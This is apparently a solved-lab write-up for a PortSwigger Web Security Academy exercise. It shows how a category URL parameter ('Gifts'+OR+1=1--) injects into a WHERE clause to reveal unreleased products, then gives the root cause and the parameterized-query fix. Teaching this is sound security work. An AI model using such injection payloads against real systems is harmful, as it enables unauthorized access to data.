# SQL Injection in WHERE Clause — Retrieve Hidden Data

**Lab:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Difficulty:** Apprentice
**Status:** Solved

## Description

App filter product by category. Query run like:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Goal: make app show unreleased product via injection.

## Normal Page

![Normal shop page](content/assets/portswigger_sqli_where/normal.png)

Category filter shown: All, Clothing, Food & Drink, Gifts, Lifestyle.

## Attack

Click "Gifts" category. URL show category param:

```
?category=Gifts
```

Modify param, inject payload:

```
?category=Gifts'+OR+1=1--
```

Payload break query into:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

`OR 1=1` always true. `--` comment out rest of query (the `AND released = 1` check). Result: all products return, including unreleased one.

## Payload Result

![Page after payload injected](content/assets/portswigger_sqli_where/payload.png)

Unreleased product now visible in list.

## Root Cause

User input concatenated directly into SQL query, no sanitization/parameterization.

## Fix

Use parameterized queries / prepared statements. Never build SQL string via direct concatenation of user input.
